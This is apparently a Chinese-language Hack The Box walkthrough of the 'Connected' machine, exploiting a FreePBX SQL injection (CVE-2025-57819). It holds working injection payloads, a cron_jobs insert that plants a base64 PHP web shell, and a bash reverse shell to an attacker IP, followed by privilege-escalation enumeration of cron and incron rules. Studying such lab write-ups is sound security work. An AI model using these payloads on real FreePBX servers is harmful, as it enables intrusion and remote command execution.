# HTB-Connected (Linux)

### 一、偵查
```!
nmap -sS -A -F -Pn <Target_IP>
```
<img width="836" height="676" alt="image" src="https://github.com/user-attachments/assets/4a154ea9-ae60-4a27-b79d-a0f5c4549299" />

```!
sudo tee -a /etc/hosts <<EOF
10.129.245.100     connected.htb 
EOF
```
<img width="426" height="256" alt="image" src="https://github.com/user-attachments/assets/0c043124-e970-4368-b429-3e25088e0a3f" />

<img width="1711" height="824" alt="image" src="https://github.com/user-attachments/assets/8a9a8b3d-f7f4-4ddc-9e8b-a03780a1660e" />

#### freePBX 是 Asterisk（電話總機系統）的網頁管理系統
漏洞介紹：https://www.sentinelone.com/vulnerability-database/cve-2025-57819/#cq=i1
<img width="1061" height="361" alt="image" src="https://github.com/user-attachments/assets/ee9331e7-3ba7-4c3d-8827-b1943e308dda" />

![Uploading image.png…]()

![image](https://hackmd.io/_uploads/SJRi2NV2fx.png)

#### 這個漏洞存在於 FreePBX 電話總機網頁管理系統中，漏洞利用其 Endpoint 模組的 brand 進行 SQL 注入漏洞，繞過身分驗證直接侵入後端資料庫，在原本用於「執行系統更新與定時備份等日常維護」的 cron_jobs 排程表中，寫入惡意指令的排程

ajax.php 原始碼：https://github.com/FreePBX/framework/blob/release/16.0.40.7/amp_conf/htdocs/admin/ajax.php
Ajax.class.php 原始碼：
https://github.com/FreePBX/framework/blob/release/16.0.40.7/amp_conf/htdocs/admin/libraries/BMO/Ajax.class.php

PoC：https://github.com/MuhammadWaseem29/SQL-Injection-and-RCE_CVE-2025-57819

``` curl!
GET //admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x'+AND+EXTRACTVALUE(1,CONCAT('~USER:',(SELECT+USER()),'~'))+--+"
```
#### 將 URL 解碼，它其實是由 & 符號隔開的 5 個控制開關：
（還原 `%5C` 為 `\`、`%27` 為 `'`、`+` 為`空格`）
| 參數 | 用途 |
| -------- | -------- |
| module=FreePBX\modules\endpoint\ajax| 利用 PHP 類別命名空間，指向 Endpoint 模組的 ajax.php|
| command=model | 告訴 Endpoint 處理程式要處理型號相關命令 |
| template=x | 傳入模板參數，隨便填一個值 |
| model=model | 傳入型號參數，隨便填一個值 |
| brand=x | 傳入品牌參數，也是公開研究指出的 SQL 注入風險位置 |
| `' AND EXTRACTVALUE(1,CONCAT('~USER:',(SELECT+USER()),'~')) -- "` |SQL注入語法| 

```!
//正常請求送出
SELECT * FROM endpoint_brands WHERE brand_name = '這裡會填brand的值'
```

```!
// 注入測試
SELECT * FROM endpoint_brands WHERE brand_name = 'x' AND EXTRACTVALUE(1,CONCAT('~USER:',(SELECT USER()),'~')) -- '
```

```!
// 盲注公式
x'+AND+EXTRACTVALUE(1, CONCAT('~自訂標籤:', (你想查的SELECT語句), '~'))--+-
```

#### 查詢DB：

```!
// 查詢DB
x'+AND+EXTRACTVALUE(1,CONCAT('~DB%3a',(SELECT+schema_name+FROM+information_schema.schemata+LIMIT+1,1),'~'))--+-
```

#### 查詢TABLES：
確認有CVE漏洞需要的`cron_jobs`
```!
// 查詢TABLES
x'+AND+EXTRACTVALUE(1,CONCAT('~TABLE%3a',(SELECT+table_name+FROM+information_schema.tables+WHERE+table_schema%3d'asterisk'+LIMIT+61,1),'~'))--+-
```
![image](https://hackmd.io/_uploads/H1DruuTnfl.png)

#### 查詢COLUMNS：
```!
// 查詢COLUMNS
x'+AND+EXTRACTVALUE(1,CONCAT('~COLUMNS%3a',(SELECT+column_name+FROM+information_schema.columns+WHERE+table_schema%3d'asterisk'+AND+table_name%3d'cron_jobs'+LIMIT+1,1),'~'))--+-
```
![image](https://hackmd.io/_uploads/H15eA_6hMx.png)
用 limit 逐一排查，確認建立排程所需欄位：
```!
modulename       // 欄位 1：指定這個排程任務歸屬於哪一個系統模組
jobname          // 欄位 2：指定這個排程任務的名稱（識別標籤）
command          // 欄位 3：指定這個排程任務要執行的 linux 系統命令
class            // 欄位 4：指定要呼叫的 php 類別名稱（若為純 linux 指令則填空）
schedule         // 欄位 5：指定排程的執行時間週期（採用標準 linux cron 格式）
max_runtime      // 欄位 6：指定該任務每次執行的最大允許時間（秒）
enabled          // 欄位 7：指定該任務的啟用狀態開關（1 代表啟用、0 代表停用）
execution_order  // 欄位 8：指定多個任務同時存在時的執行優先順序
```

#### 建立排程
建立 cmd.php，取得 web shell
```!
// 加入排程 建立cmd.php
x'%3b+INSERT+INTO+cron_jobs+(modulename,jobname,command,class,schedule,max_runtime,enabled,execution_order)+VALUES+('sysadmin',+'poc-webshell','echo+PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8%2bCg%3d%3d|base64+-d+>/var/www/html/cmd.php',NULL,'*+*+*+*+*',30,1,1)--+-
```
![image](https://hackmd.io/_uploads/r1tbuOT2Ml.png)

#### 建立 cmd.php 的指令拆解
```!
x';  // 單引號閉合，並用分號結束第一條指令，開始第二條指令
INSERT INTO cron_jobs (  // 向 FreePBX 內建的系統排程table中塞入新資料
    modulename,     
    jobname,        
    command,        
    class,          
    schedule,       
    max_runtime,    
    enabled,        
    execution_order 
) 
VALUES (  // VALUES填入與上方8個欄位對應的具體數值
    'sysadmin',     // 對應 modulename：這裡偽裝成是由系統管理（sysadmin）模組所建立的
    'poc-webshell', // 對應 jobname：自訂的任務名稱，隨便填
    'echo PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+Cg==|base64 -d >/var/www/html/cmd.php', // 對應 command：將 Base64 編碼的 web shell 寫入網頁目錄並產出 cmd.php
    NULL,           // 對應 class：因為是跑純 Linux 指令而非 PHP 類別，因此填寫 NULL
    '* * * * *',    // 對應 schedule：Cron 格式的五個星號，代表「每分鐘」都強制作業系統執行一次
    30,             // 對應 max_runtime：限制這個指令最多只能跑 30 秒，防範行程卡死
    1,              // 對應 enabled：數字 1 代表 True，強制開啟並活化這個排程任務
    1               // 對應 execution_order：設定執行順序權重為 1
)-- -
```

```!
// php 的內容要先編碼成 base64
echo '<?php if(isset($_GET["cmd"])){system($_GET["cmd"]);}?>' | base64
```

#### 測試 cmd.php
```!
// 測試回應
/cmd.php?cmd=id

// 回應結果
uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)
```
![image](https://hackmd.io/_uploads/ByURw_62fl.png)

### 二、初始入侵
#### 建立 reverse shell
```!
//reverse shell 
bash -c 'bash -i >& /dev/tcp/192.168.132.37/4444 0>&1' #

//url 編碼
bash+-c+'bash+-i+>%26+/dev/tcp/10.10.15.41/4444+0>%261'+%23
```
![image](https://hackmd.io/_uploads/Hyl-OFTnMx.png)

這個 asterisk 的 uid=999 表示他是服務，但 gid=1000 又是個使用者群組，所以大概有個家目錄
![image](https://hackmd.io/_uploads/SyNfqKT3zg.png)
![image](https://hackmd.io/_uploads/Sk7YHa63Gl.png)

#### 取得 user flag
![image](https://hackmd.io/_uploads/H1cw0tT3Gx.png)

### 三、提權
#### 

#### 查看目標主機現有用戶
```
cat /etc/passwd
```
![image](https://hackmd.io/_uploads/HyaEk963fe.png)

#### 查看該使用者能用sudo做什麼事
```
sudo -l
```
![image](https://hackmd.io/_uploads/rkHlORa2Ge.png)

#### 查看目標主機有開啟的服務
```
ss -tulnp
```
![image](https://hackmd.io/_uploads/ryZNO0T2fx.png)
`-t=tcp`、`-u=udp`、`-l=listen`、`-n=numeric`、`-p=processes`

:::spoiler **[PORT]**

### 1. VoIP / Asterisk 相關服務 (UDP)

• Port 5060 (UDP)：SIP 協定標準埠。這是 Asterisk 最核心的 Port，用於建立、維持和結束 VoIP 語音或視訊通話。
• Port 4569 (UDP)：IAX2 協定埠（Inter-Asterisk eXchange）。專門用於 Asterisk 伺服器之間的通訊與中繼（Trunking），效率比 SIP 更高。
• Port 5038 (TCP)：AMI (Asterisk Manager Interface)。允許外部管理軟體連線進來監控或控制 Asterisk 的通話狀態。
• 其他高位元 UDP Ports (如 43732, 45864, 60000等)：通常是 RTP (Real-time Transport Protocol) 語音串流動態配置的埠口，或是 pnp_server 用於 IP 電話自動佈署（Provisioning）的服務。

### 2. 後端資料庫與快取服務

這幾個服務都只在本地 127.0.0.1：
• Port 3306 (TCP)：MySQL / MariaDB 資料庫。通常用來儲存 Asterisk 的通話紀錄（CDR）、使用者帳密或設定檔。
• Port 27017 (TCP)：MongoDB NoSQL 資料庫。常用於一些現代網頁後台或即時通訊套件的資料儲存。
• Port 6379 (TCP)：Redis 記憶體快取。用於加速系統讀取、快取 Session 或處理高併發的佇列。

### 3. 網頁服務

• Port 80 (TCP, [::]:80)：HTTP 網頁服務。對外開放，通常是 VoIP 系統的網頁管理後台（例如 FreePBX、Issabel 等）或 API 介面。
• Port 443 (TCP, [::]:443)：HTTPS 加密網頁服務。安全版的網頁後台。
• Port 4000 (TCP)：常見於 Node.js、Strapi 或常見的前端 Web 應用程式開發監聽埠，這裡同樣被限制在本地端（127.0.0.1）。

### 4. 基礎架構與系統管理服務

• Port 22 (TCP, *:22 與 [::]:22)：SSH 遠端連線
• Port 25 (TCP)：SMTP 郵件服務。用於伺服器發送信件（例如：語音留言通知信、系統警報等）。
• Port 123 (UDP)：NTP 網路時間協定。這對 VoIP 伺服器極度重要，因為通話紀錄（CDR）的計費與時間戳記必須保證絕對精準。
• Port 323 (UDP)：Chrony (NTP 的替代軟體)。同樣用於本機系統時間同步。
• Port 68 (UDP)：DHCP 客戶端。用於自動向路由器獲取這台伺服器的 IP 地址。
• Port 5353 (UDP)：mDNS (Multicast DNS)。用於區域網路內自動尋找裝置（如 Avahi / Bonjour 服務）。
:::

#### 查看排程
```!
cat /etc/crontab
```
![image](https://hackmd.io/_uploads/rJjwliypGg.png)
:::info **沒有排程**
#### **沒有排程**
- SHELL=/bin/bash
    • 含意：指定排程執行時要使用 Bash Shell 來解析和執行指令。
- PATH=/sbin:/bin:/usr/sbin:/usr/bin
	• 含意：設定排程執行時，系統尋找指令的預設路徑（資料夾範圍）。
- MAILTO=root
	• 含意：當排程執行完畢後，如果腳本有任何輸出訊息（Stdout）或報錯訊息（Stderr），系統會自動把這些內容包成一封內部郵件，發送給 root 帳號。
:::

#### 查看第三方軟體排程
```!
cat /etc/cron.d/*
```
![image](https://hackmd.io/_uploads/r1aeGokpzl.png)
:::info **排程解釋**
#### **排程解釋**
- 每小時常規維護
	• 時間：每小時的第 1 分鐘（例如 01:01, 02:01）
	• 身分：root
	• 指令：run-parts /etc/cron.hourly（執行該目錄下的所有腳本）
- FreePBX 系統更新檢查
	• 時間：每天凌晨 00:00（午夜）
	• 身分：root
	• 指令：[ -e /etc/profile.d/z001-updates.sh ] && /etc/profile.d/z001-updates.sh update（檢查更新腳本是否存在，存在就執行更新）
- 硬體磁碟陣列（RAID）檢查
	• 時間：每週日的凌晨 1:00
	• 身分：root
	• 指令：/usr/sbin/raid-check（檢查硬碟健康狀況）
- 權限不足的報錯
	• 檔案：/etc/cron.d/sysstat
	• 原因：目前的 asterisk 帳號權限不夠，只有 root 管理員才能讀取這個檔案的內容。
:::

#### 確認排程可否利用
```!
ls -la /etc/profile.d/z001-updates.sh
ls -la /etc/cron.hourly/
```
![image](https://hackmd.io/_uploads/SJRVmjkpGe.png)
現使用者 asterisk 無權修改

#### 查看事件觸發排程
https://community.freepbx.org/t/incron-files-how-are-they-used-what-uses-them/79247
![image](https://hackmd.io/_uploads/HkUGBiy6Ml.png)
```!
cat /etc/incron.d/*
```
![image](https://hackmd.io/_uploads/HkbHNjypfg.png)
:::info
#### **排程解釋**
- VPN 模組觸發
	• 觸發條件：當 /var/spool/asterisk/sysadmin/vpnget 檔案被寫入並關閉
	• 執行動作：以 root 權限執行 /usr/sbin/sysadmin_openvpn -d
- 防禦系統（Fail2ban）關閉
	• 觸發條件：當 /var/spool/asterisk/sysadmin/intrusion_detection_stop 檔案被寫入並關閉
	• 執行動作：以 root 權限執行 /etc/init.d/fail2ban stop（關閉防火牆防禦）
- 系統排程更新
	• 觸發條件：當 /var/spool/asterisk/sysadmin/update_system_cron 檔案被寫入並關閉
	• 執行動作：以 root 權限執行 /usr/sbin/sysadmin_update_set_cron
- 通訊埠管理設定
	• 觸發條件：當 /var/spool/asterisk/sysadmin/portmgmt_setup 檔案被寫入並關閉
	• 執行動作：以 root 權限執行 /usr/sbin/sysadmin_portmgmt
- 硬體驅動與網路重啟 (Wanrouter / Dahdi / HA)
	• 觸發條件：當指定的監控檔案（如 wanrouter_restart, ha_trigger）被寫入並關閉
	• 執行動作：以 root 權限執行對應的系統腳本（如重啟硬體、高可用性觸發）
- 本地系統管理員觸發（關鍵 $#）
	• 觸發條件：當有人在 /usr/local/asterisk/incron 目錄下建立或寫入任何檔案
	• 執行動作：以 root 權限執行 /usr/bin/sysadmin_manager --local [檔案名稱]
- 語音系統進階觸發（關鍵 $#）
	• 觸發條件：當有人在 /var/spool/asterisk/incron 目錄下修改、變更屬性或寫入任何檔案
	• 執行動作：以 root 權限執行 /usr/bin/sysadmin_manager [檔案名稱]
:::

